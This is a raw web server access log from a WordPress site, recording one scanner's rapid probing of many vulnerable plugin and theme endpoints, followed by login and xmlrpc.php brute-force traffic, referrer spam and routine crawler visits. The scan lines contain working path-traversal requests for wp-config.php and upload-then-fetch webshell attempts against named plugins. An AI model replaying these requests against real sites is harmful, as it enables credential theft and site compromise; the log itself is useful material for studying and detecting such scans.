145.239.29.60 - - [01/Nov/2018:18:56:51 +0000] "GET /wp-content/uploads/powerzoomer/1_uploadfolder/big/up.php HTTP/1.1" 404 17645 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:51 +0000] "POST /wp-admin/admin.php?page=catpro_manage HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:52 +0000] "GET /wp-login.php?redirect_to=http%3A%2F%2Fsupermonkeystar.com%2Fwp-admin%2Fadmin.php%3Fpage%3Dcatpro_manage&reauth=1 HTTP/1.1" 200 1638 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:53 +0000] "GET /wp-content/uploads/catpro/1_uploadfolder/big/up.php HTTP/1.1" 404 16660 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:53 +0000] "POST /wp-admin/admin.php?page=blaze_manage HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:53 +0000] "GET /wp-login.php?redirect_to=http%3A%2F%2Fsupermonkeystar.com%2Fwp-admin%2Fadmin.php%3Fpage%3Dblaze_manage&reauth=1 HTTP/1.1" 200 1542 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:54 +0000] "GET /wp-content/uploads/blaze/1_uploadfolder/big/up.php HTTP/1.1" 404 17024 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:55 +0000] "POST /?gf_page=upload HTTP/1.1" 404 9449 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:55 +0000] "GET /wp-content/_input_3_attari.phtml HTTP/1.1" 404 10155 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:56 +0000] "POST /wp-admin/admin-post.php?page=wysija_campaigns&action=themes HTTP/1.1" 200 40 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:56 +0000] "GET /wp-content/uploads/wysija/themes/attari/attari.php HTTP/1.1" 403 235 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:57 +0000] "POST /wp-content/plugins/cherry-plugin/admin/import-export/upload.php HTTP/1.1" 404 16735 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:58 +0000] "GET /wp-content/plugins/cherry-plugin/admin/import-export/up.php HTTP/1.1" 404 17284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:59 +0000] "POST /wp-content/plugins/formcraft/file-upload/server/content/upload.php HTTP/1.1" 404 17183 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:59 +0000] "GET /wp-content/up.php HTTP/1.1" 404 9915 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:01 +0000] "POST /wp-content/themes/purevision/scripts/admin/uploadify/uploadify.php HTTP/1.1" 404 17234 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:01 +0000] "GET /up.php HTTP/1.1" 404 10148 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:02 +0000] "POST /wp-content/plugins/php-event-calendar/server/file-uploader/ HTTP/1.1" 404 16939 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:57:03 +0000] "GET /wp-content/plugins/php-event-calendar/server/file-uploader/up.php HTTP/1.1" 404 17353 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:57:04 +0000] "POST /wp-content/themes/synoptic/lib/avatarupload/upload.php HTTP/1.1" 404 16841 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:57:05 +0000] "GET /wp-content/uploads/markets/avatars/up.php HTTP/1.1" 404 17246 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:57:06 +0000] "POST /wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload HTTP/1.1" 404 16867 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:57:07 +0000] "GET /wp-content/uploads/up.php HTTP/1.1" 404 16669 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:57:08 +0000] "GET /?up_auto_log=true HTTP/1.1" 200 19742 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:57:09 +0000] "POST /wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php HTTP/1.1" 404 17128 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:57:10 +0000] "GET /wp-content/themes/Directory/images/tmp/up.PhP.txt HTTP/1.1" 404 16491 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:57:11 +0000] "POST /wp-content/plugins/wp-symposium/server/php/index.php HTTP/1.1" 404 16996 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:57:12 +0000] "GET /wp-content/plugins/wp-symposium/server/php/up.php HTTP/1.1" 404 16987 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:57:13 +0000] "POST /wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php HTTP/1.1" 404 16497 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:57:14 +0000] "GET /wp-content/uploads/settingsimages/up.php HTTP/1.1" 404 17001 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:57:14 +0000] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1" 200 43 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:15 +0000] "GET /wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php HTTP/1.1" 404 16937 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:16 +0000] "GET /wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php HTTP/1.1" 404 17034 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:17 +0000] "GET /wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php HTTP/1.1" 404 17507 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:18 +0000] "GET /wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php HTTP/1.1" 404 16814 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:19 +0000] "GET /wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php HTTP/1.1" 404 16832 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:20 +0000] "GET /wp-content/themes/felis/download.php?file=../wp-config.php HTTP/1.1" 404 16950 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:20 +0000] "GET /wp-content/force-download.php?file=../wp-config.php HTTP/1.1" 404 10092 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:21 +0000] "GET /wp-content/themes/FR0_theme/down.php?path=http://supermonkeystar.com/wp-config.php HTTP/1.1" 404 16884 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:22 +0000] "GET /wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10 HTTP/1.1" 404 16580 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:23 +0000] "GET /wp-content/plugins/history-collection/download.php?var=../../../wp-config.php HTTP/1.1" 404 17020 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:24 +0000] "GET /wp-content/plugins/image-export/download.php?file=../../../wp-config.php HTTP/1.1" 404 16906 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:25 +0000] "GET /wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php HTTP/1.1" 200 43 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:26 +0000] "GET /wp-content/themes/markant/download.php?file=../../wp-config.php HTTP/1.1" 404 16831 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:26 +0000] "GET /wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php HTTP/1.1" 404 17156 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:27 +0000] "GET /wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php HTTP/1.1" 404 16727 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:28 +0000] "GET /wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=..%2F..%2F..%2F..%2F..%2F..%2Fwp-config.php HTTP/1.1" 404 16802 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:29 +0000] "GET /wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?name=wp-config.php&path=../../../../../../../wp-config.php HTTP/1.1" 404 10533 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:30 +0000] "GET /themes/SMWF/inc/download.php?file=../wp-config.php HTTP/1.1" 404 16750 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:31 +0000] "GET /wp-content/themes/TheLoft/download.php?file=../../../wp-config.php HTTP/1.1" 404 16934 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:31 +0000] "GET /wp-content/plugins/wp-filemanager/incl/libfile.php?&path=../../&filename=wp-config.php&action=download HTTP/1.1" 301 5 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:32 +0000] "GET /wp-content/plugins/wp-filemanager/incl/libfile.php?path=../../&filename=wp-config.php&action=download HTTP/1.1" 404 17151 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:33 +0000] "GET /wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php HTTP/1.1" 404 16938 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:34 +0000] "GET /wp-content/themes/epic/includes/download.php?file=wp-config.php HTTP/1.1" 404 17185 "-" "python-requests/2.20.0"
145.239.29.60 - - [01/Nov/2018:18:57:35 +0000] "GET /wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php HTTP/1.1" 404 17107 "-" "python-requests/2.20.0"
54.210.203.143 - - [01/Nov/2018:19:00:05 +0000] "GET /wp-login.php HTTP/1.1" 200 1334 "https://www.google.com/url?f56203b63b529ba33edb8360c0052b8c" "Mozilla/5.0 (Windows NT 6.0; rv:33.0) Gecko/20100101 Firefox/33.0"
54.210.203.143 - - [01/Nov/2018:19:00:07 +0000] "POST /wp-login.php HTTP/1.1" 200 1885 "https://www.google.com/url?f56203b63b529ba33edb8360c0052b8c" "Mozilla/5.0 (Windows NT 6.0; rv:33.0) Gecko/20100101 Firefox/33.0"
97.74.228.115 - - [01/Nov/2018:19:03:13 +0000] "POST /xmlrpc.php HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
220.181.125.138 - - [01/Nov/2018:20:21:02 +0000] "GET /robots.txt HTTP/1.1" 200 78 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
220.181.125.138 - - [01/Nov/2018:20:21:05 +0000] "GET / HTTP/1.1" 200 19182 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
218.66.74.237 - - [01/Nov/2018:20:39:41 +0000] "HEAD /wp-content/themes/twentyseventeen/search.php HTTP/1.1" 200 0 "-" "-"
97.74.228.115 - - [01/Nov/2018:20:58:03 +0000] "POST /xmlrpc.php HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
40.77.167.80 - - [01/Nov/2018:21:28:22 +0000] "GET /tag/motion/feed/ HTTP/1.1" 200 6407 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.121 - - [01/Nov/2018:21:37:32 +0000] "GET /post_tag-sitemap.xml HTTP/1.1" 200 463 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
212.178.211.132 - - [01/Nov/2018:21:56:54 +0000] "GET /wp-clear.php HTTP/1.1" 404 12826 "supermonkeystar.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36"
185.220.100.253 - - [01/Nov/2018:22:15:44 +0000] "GET /wp-login.php HTTP/1.1" 200 2862 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
185.220.100.253 - - [01/Nov/2018:22:15:45 +0000] "POST /wp-login.php HTTP/1.0" 200 3072 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
97.74.228.115 - - [01/Nov/2018:22:51:07 +0000] "POST /xmlrpc.php HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
100.24.20.212 - - [01/Nov/2018:23:29:30 +0000] "GET /wp-login.php HTTP/1.1" 200 1662 "https://www.google.com/url?f56203b63b529ba33edb8360c0052b8c" "Mozilla/5.0 (Windows NT 6.2; rv:29.0) Gecko/20120101 Firefox/29.0"
100.24.20.212 - - [01/Nov/2018:23:29:39 +0000] "POST /wp-login.php HTTP/1.1" 200 1943 "https://www.google.com/url?f56203b63b529ba33edb8360c0052b8c" "Mozilla/5.0 (Windows NT 6.2; rv:29.0) Gecko/20120101 Firefox/29.0"
80.90.55.172 - - [01/Nov/2018:23:30:03 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)"
54.38.139.8 - - [01/Nov/2018:23:41:49 +0000] "GET /robots.txt HTTP/1.1" 200 78 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0"
54.38.139.8 - - [01/Nov/2018:23:41:50 +0000] "GET /?author=1 HTTP/1.1" 301 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0"
54.38.139.8 - - [01/Nov/2018:23:41:52 +0000] "POST /xmlrpc.php HTTP/1.1" 200 85840 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0"
54.38.139.8 - - [01/Nov/2018:23:41:53 +0000] "POST /xmlrpc.php HTTP/1.1" 200 85824 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0"
97.74.228.115 - - [02/Nov/2018:00:44:49 +0000] "POST /xmlrpc.php HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
176.8.88.12 - - [02/Nov/2018:01:45:54 +0000] "GET / HTTP/1.1" 499 0 "http://doxysexy.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
31.170.123.73 - - [02/Nov/2018:01:45:54 +0000] "POST /wp-cron.php?doing_wp_cron=1541123153.5944349765777587890625 HTTP/1.1" 499 0 "http://supermonkeystar.com/wp-cron.php?doing_wp_cron=1541123153.5944349765777587890625" "WordPress/4.7.11; http://supermonkeystar.com"
176.8.88.12 - - [02/Nov/2018:01:45:54 +0000] "GET / HTTP/1.1" 200 1067 "http://doxysexy.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
176.8.88.12 - - [02/Nov/2018:01:45:55 +0000] "GET / HTTP/1.1" 200 1074 "http://doxysexy.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
178.137.165.225 - - [02/Nov/2018:01:54:13 +0000] "GET / HTTP/1.1" 200 1098 "https://mega-polis.biz.ua/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
178.137.165.225 - - [02/Nov/2018:01:54:15 +0000] "GET / HTTP/1.1" 200 77452 "https://mega-polis.biz.ua/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
178.154.244.10 - - [02/Nov/2018:02:10:17 +0000] "GET /robots.txt HTTP/1.1" 200 78 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
178.154.244.10 - - [02/Nov/2018:02:10:21 +0000] "GET /video-vimeo/feed/ HTTP/1.1" 200 782 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
97.74.228.115 - - [02/Nov/2018:02:37:45 +0000] "POST /xmlrpc.php HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
